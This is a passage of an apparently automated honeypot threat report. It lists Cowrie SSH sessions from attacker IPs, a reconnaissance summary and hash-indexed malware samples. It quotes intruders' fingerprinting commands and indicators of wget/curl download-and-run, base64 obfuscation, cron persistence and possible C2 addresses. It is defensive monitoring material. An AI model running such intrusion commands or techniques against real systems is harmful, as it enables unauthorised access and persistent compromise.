| `2026-09-05 12:26:32` | `cowrie.command.input` |
| `2026-09-05 12:26:32` | `cowrie.command.input` |
| `2026-09-05 12:26:32` | `cowrie.command.success` |
| `2026-09-05 12:26:32` | `cowrie.command.input` |
| `2026-09-05 12:26:32` | `cowrie.command.input` |
| `2026-09-05 12:26:32` | `cowrie.command.input` |
| `2026-09-05 12:26:32` | `cowrie.command.input` |
| `2026-09-05 12:26:35` | `cowrie.log.closed` |
| `2026-09-05 12:26:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0988310d0025

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-05 12:28 |
| **Last Seen** | 2026-09-05 12:28 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 12:28:18` | `cowrie.session.connect` |
| `2026-09-05 12:28:22` | `cowrie.client.version` |
| `2026-09-05 12:28:22` | `cowrie.client.kex` |
| `2026-09-05 12:28:39` | `cowrie.login.success` |
| `2026-09-05 12:28:46` | `cowrie.session.params` |
| `2026-09-05 12:28:46` | `cowrie.command.input` |
| `2026-09-05 12:28:46` | `cowrie.command.input` |
| `2026-09-05 12:28:46` | `cowrie.command.input` |
| `2026-09-05 12:28:46` | `cowrie.command.input` |
| `2026-09-05 12:28:46` | `cowrie.command.input` |
| `2026-09-05 12:28:46` | `cowrie.command.success` |
| `2026-09-05 12:28:46` | `cowrie.command.input` |
| `2026-09-05 12:28:46` | `cowrie.command.input` |
| `2026-09-05 12:28:46` | `cowrie.command.input` |
| `2026-09-05 12:28:46` | `cowrie.command.input` |
| `2026-09-05 12:28:50` | `cowrie.log.closed` |
| `2026-09-05 12:28:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4e270bb98a6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-05 12:30 |
| **Last Seen** | 2026-09-05 12:30 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 12:30:22` | `cowrie.session.connect` |
| `2026-09-05 12:30:26` | `cowrie.client.version` |
| `2026-09-05 12:30:26` | `cowrie.client.kex` |
| `2026-09-05 12:30:41` | `cowrie.login.success` |
| `2026-09-05 12:30:49` | `cowrie.session.params` |
| `2026-09-05 12:30:49` | `cowrie.command.input` |
| `2026-09-05 12:30:49` | `cowrie.command.input` |
| `2026-09-05 12:30:49` | `cowrie.command.input` |
| `2026-09-05 12:30:49` | `cowrie.command.input` |
| `2026-09-05 12:30:49` | `cowrie.command.input` |
| `2026-09-05 12:30:49` | `cowrie.command.success` |
| `2026-09-05 12:30:49` | `cowrie.command.input` |
| `2026-09-05 12:30:49` | `cowrie.command.input` |
| `2026-09-05 12:30:49` | `cowrie.command.input` |
| `2026-09-05 12:30:49` | `cowrie.command.input` |
| `2026-09-05 12:30:53` | `cowrie.log.closed` |
| `2026-09-05 12:30:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aeb72793f6a5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-05 12:32 |
| **Last Seen** | 2026-09-05 12:32 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 12:32:13` | `cowrie.session.connect` |
| `2026-09-05 12:32:16` | `cowrie.client.version` |
| `2026-09-05 12:32:16` | `cowrie.client.kex` |
| `2026-09-05 12:32:29` | `cowrie.login.success` |
| `2026-09-05 12:32:37` | `cowrie.session.params` |
| `2026-09-05 12:32:37` | `cowrie.command.input` |
| `2026-09-05 12:32:37` | `cowrie.command.input` |
| `2026-09-05 12:32:37` | `cowrie.command.input` |
| `2026-09-05 12:32:37` | `cowrie.command.input` |
| `2026-09-05 12:32:37` | `cowrie.command.input` |
| `2026-09-05 12:32:37` | `cowrie.command.success` |
| `2026-09-05 12:32:37` | `cowrie.command.input` |
| `2026-09-05 12:32:37` | `cowrie.command.input` |
| `2026-09-05 12:32:37` | `cowrie.command.input` |
| `2026-09-05 12:32:37` | `cowrie.command.input` |
| `2026-09-05 12:32:41` | `cowrie.log.closed` |
| `2026-09-05 12:32:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5de139dad7b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-05 12:34 |
| **Last Seen** | 2026-09-05 12:34 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 12:34:04` | `cowrie.session.connect` |
| `2026-09-05 12:34:09` | `cowrie.client.version` |
| `2026-09-05 12:34:09` | `cowrie.client.kex` |
| `2026-09-05 12:34:22` | `cowrie.login.success` |
| `2026-09-05 12:34:30` | `cowrie.session.params` |
| `2026-09-05 12:34:30` | `cowrie.command.input` |
| `2026-09-05 12:34:30` | `cowrie.command.input` |
| `2026-09-05 12:34:30` | `cowrie.command.input` |
| `2026-09-05 12:34:30` | `cowrie.command.input` |
| `2026-09-05 12:34:30` | `cowrie.command.input` |
| `2026-09-05 12:34:30` | `cowrie.command.success` |
| `2026-09-05 12:34:30` | `cowrie.command.input` |
| `2026-09-05 12:34:30` | `cowrie.command.input` |
| `2026-09-05 12:34:30` | `cowrie.command.input` |
| `2026-09-05 12:34:30` | `cowrie.command.input` |
| `2026-09-05 12:34:33` | `cowrie.log.closed` |
| `2026-09-05 12:34:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79543827fbce

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-05 12:47 |
| **Last Seen** | 2026-09-05 12:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 12:47:27` | `cowrie.session.connect` |
| `2026-09-05 12:47:27` | `cowrie.client.version` |
| `2026-09-05 12:47:27` | `cowrie.client.kex` |
| `2026-09-05 12:47:27` | `cowrie.login.success` |
| `2026-09-05 12:47:27` | `cowrie.direct-tcpip.request` |
| `2026-09-05 12:47:27` | `cowrie.direct-tcpip.data` |
| `2026-09-05 12:47:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `92.204.138[.]142` | **107** | 2026-09-05 07:07 | 2026-09-05 12:53 | 55m | 0 | `T1592` | 🟠 MEDIUM |
| `73.133.67[.]244` | **4** | 2026-09-05 10:54 | 2026-09-05 10:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **3** | 2026-09-05 10:14 | 2026-09-05 12:13 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `174.140.96[.]224` | **3** | 2026-09-05 07:17 | 2026-09-05 07:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.99.6[.]101` | **3** | 2026-09-05 11:54 | 2026-09-05 11:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]232` | **3** | 2026-09-05 12:00 | 2026-09-05 12:36 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.4[.]240` | **2** | 2026-09-05 09:21 | 2026-09-05 09:23 | 2m | 0 | `T1592` | 🟢 LOW |
| `106.75.16[.]92` | **2** | 2026-09-05 08:37 | 2026-09-05 08:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]235` | **2** | 2026-09-05 12:15 | 2026-09-05 12:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]84` | **2** | 2026-09-05 06:59 | 2026-09-05 07:36 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]228` | **2** | 2026-09-05 09:08 | 2026-09-05 09:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `4.148.0[.]158` | **2** | 2026-09-05 09:05 | 2026-09-05 09:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `46.201.15[.]135` | **2** | 2026-09-05 09:08 | 2026-09-05 09:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]186` | **2** | 2026-09-05 12:19 | 2026-09-05 12:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]83` | **2** | 2026-09-05 12:28 | 2026-09-05 12:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]71` | **2** | 2026-09-05 10:56 | 2026-09-05 11:14 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `95.59.210[.]238` | **2** | 2026-09-05 08:53 | 2026-09-05 08:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | 1 | 2026-09-05 07:41 | 2026-09-05 07:42 | 36s | 0 | `T1592` | 🟢 LOW |
| `111.7.172[.]14` | 1 | 2026-09-05 10:39 | 2026-09-05 10:40 | 13s | 0 | `T1592` | 🟢 LOW |
| `14.103.117[.]84` | 1 | 2026-09-05 07:58 | 2026-09-05 08:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `154.16.44[.]103` | 1 | 2026-09-05 08:24 | 2026-09-05 08:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]38` | 1 | 2026-09-05 06:59 | 2026-09-05 06:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.223.235[.]4` | 1 | 2026-09-05 09:19 | 2026-09-05 09:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.223.235[.]47` | 1 | 2026-09-05 08:25 | 2026-09-05 08:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]151` | 1 | 2026-09-05 07:19 | 2026-09-05 07:19 | 10s | 0 | `T1592` | 🟢 LOW |
| `193.90.12[.]122` | 1 | 2026-09-05 10:11 | 2026-09-05 10:12 | 41s | 0 | `T1592` | 🟢 LOW |
| `2.57.17[.]64` | 1 | 2026-09-05 09:19 | 2026-09-05 09:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.112.142[.]73` | 1 | 2026-09-05 12:45 | 2026-09-05 12:45 | 11s | 0 | `T1592` | 🟢 LOW |
| `209.99.186[.]128` | 1 | 2026-09-05 11:58 | 2026-09-05 11:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `216.244.201[.]41` | 1 | 2026-09-05 09:25 | 2026-09-05 09:25 | 11s | 0 | `T1592` | 🟢 LOW |
| `45.133.173[.]232` | 1 | 2026-09-05 07:19 | 2026-09-05 07:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-09-05 07:02 | 2026-09-05 07:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]8` | 1 | 2026-09-05 08:35 | 2026-09-05 08:35 | 4s | 0 | `T1592` | 🟢 LOW |
| `45.77.61[.]56` | 1 | 2026-09-05 08:08 | 2026-09-05 08:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-09-05 07:38 | 2026-09-05 07:38 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]59` | 1 | 2026-09-05 07:38 | 2026-09-05 07:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-09-05 07:38 | 2026-09-05 07:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-09-05 08:35 | 2026-09-05 08:35 | 8s | 0 | `T1592` | 🟢 LOW |
| `61.129.41[.]146` | 1 | 2026-09-05 06:55 | 2026-09-05 06:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]222` | 1 | 2026-09-05 10:35 | 2026-09-05 10:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `76.183.148[.]68` | 1 | 2026-09-05 10:17 | 2026-09-05 10:18 | 11s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-09-05 08:12 | 2026-09-05 08:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-09-05 10:48 | 2026-09-05 10:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]48` | 1 | 2026-09-05 10:59 | 2026-09-05 10:59 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

